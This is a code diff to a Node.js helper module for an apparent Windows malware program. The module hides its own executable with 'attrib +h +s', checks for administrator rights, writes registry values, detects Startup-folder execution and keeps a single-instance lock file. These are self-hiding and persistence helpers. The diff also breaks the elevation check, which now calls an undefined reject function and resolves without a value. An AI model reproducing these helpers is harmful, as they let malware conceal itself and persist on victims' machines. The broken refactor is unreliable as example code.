@@ -38,17 +38,24 @@ const setRegistryValue = ({ keyPath, name, type, value }) => {
     });
 
     return new Promise((resolve, reject) => {
-        regKey.set(name, type, value, (err) => {
-            if (err) return reject(err);
-            resolve();
+        regKey.set(name, Winreg[type], value, (error) => {
+            if (!error) {
+                resolve();
+            } else {
+                reject(error);
+            }
         });
     });
 };
 
 const isElevated = async () => {
     return new Promise((resolve) => {
-        child_process.exec('net session', (err) => {
-            resolve(!err);
+        child_process.exec('net session', (error) => {
+            if (!error) {
+                resolve();
+            } else {
+                reject(error);
+            }
         });
     });
 };
@@ -71,6 +78,11 @@ const isRunningStartupDir = () => {
     return false;
 };
 
+const randString = (length) => {
+    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
+};
+
 const lockFilePath = path.join(__dirname, `.wish.lock`);
 
 const isWishRunning = () => {
@@ -91,11 +103,11 @@ const cleanUpLock = () => {
 const hideSelf = async () => {
     const exe = process.execPath;
     return new Promise((resolve, reject) => {
-        child_process.exec(`attrib +h +s "${exe}"`, (err) => {
-            if (err) {
-                reject(err);
-            } else {
+        child_process.exec(`attrib +h +s "${exe}"`, (error) => {
+            if (!error) {
                 resolve();
+            } else {
+                reject(error);
             }
         });
     });
@@ -103,6 +115,7 @@ const hideSelf = async () => {
 
 module.exports = {
     delay,
+    randString,
     isWishRunning,
     setRegistryValue,
     cleanUpLock,
